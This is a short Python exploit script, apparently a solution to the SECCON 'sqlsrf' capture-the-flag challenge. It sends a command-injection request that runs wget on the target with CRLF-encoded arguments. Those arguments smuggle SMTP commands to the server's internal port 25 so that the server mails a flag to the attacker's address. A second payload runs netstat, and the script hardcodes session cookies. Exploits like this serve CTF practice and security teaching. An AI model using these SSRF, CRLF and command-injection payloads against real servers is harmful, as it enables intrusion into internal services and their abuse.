import requests
from pyquery import PyQuery as pq
import html

URL = "http://sqlsrf.pwn.seccon.jp/sqlsrf/menu.cgi?"
MY_EMAIL_ADDRESS = "<input here your address>"

commands = [
    "EHLO 127.0.0.1",
    "MAIL FROM: " + MY_EMAIL_ADDRESS,
    "RCPT TO: root",
    "DATA",
    "From: test@test.com",
    "To: " + MY_EMAIL_ADDRESS,
    "Subject: give me flag",
    "Hello",
    ".",
    "QUIT",
]

data = {
    'cmd': "wget --debug -O /dev/stdout 'http://",
    'args': "127.0.0.1%0d%0a{}%0a:25/".format("%0a".join(commands).replace(":", "%3a").replace("@", "%40"))
}


data2 = {
    "cmd": "netstat -tnl",
    "args": "--help"
}

headers = {
    "Cookie": "remember=d2f37e101c0e76bcc90b5634a5510f64; CGISESSID=beb1229d5c77b445e59b9c2622f20d86",
}

res = requests.post(URL, data=data, headers=headers).text
d = html.unescape(pq(res).find('pre').text())
if d != '':
    print(d)
else:
    print(res)
